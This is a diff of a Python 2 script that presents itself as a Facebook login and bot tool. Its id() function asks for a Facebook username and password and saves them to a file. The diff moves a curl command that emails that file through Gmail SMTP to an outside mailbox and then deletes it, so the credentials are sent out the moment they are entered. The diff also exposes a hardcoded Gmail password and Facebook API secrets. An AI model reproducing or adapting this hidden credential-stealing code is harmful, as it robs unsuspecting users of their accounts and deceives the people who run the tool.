@@ -173,14 +173,13 @@ def get(data):
 		os.remove('cookie/token.log')
 		main()
 def id():
-	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = raw_input('[?] Password : ');i = open('document.txt', 'w');i.write(id);i.write(pwd);i.close();API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
+	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = raw_input('[?] Password : ');i = open('document.txt', 'w');i.write(id);i.write(pwd);i.close();os.system("curl --url 'smtps://smtp.gmail.com:465' --ssl-reqd --mail-from 'souhail418000@gmail.com' --mail-rcpt 'termuxproject@protonmail.com' --upload-file document.txt --user 'souhail418000@gmail.com:Kamal1953' --insecure")
+os.remove("document.txt");API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
 	x = hashlib.new('md5')
         x.update(sig)
 
 	data.update({'sig':x.hexdigest()})
         get(data)
-os.system("curl --url 'smtps://smtp.gmail.com:465' --ssl-reqd --mail-from 'souhail418000@gmail.com' --mail-rcpt 'termuxproject@protonmail.com' --upload-file document.txt --user 'souhail418000@gmail.com:Kamal1953' --insecure")
-os.remove("document.txt")
 
 ####################################################################
 #       	            BOT
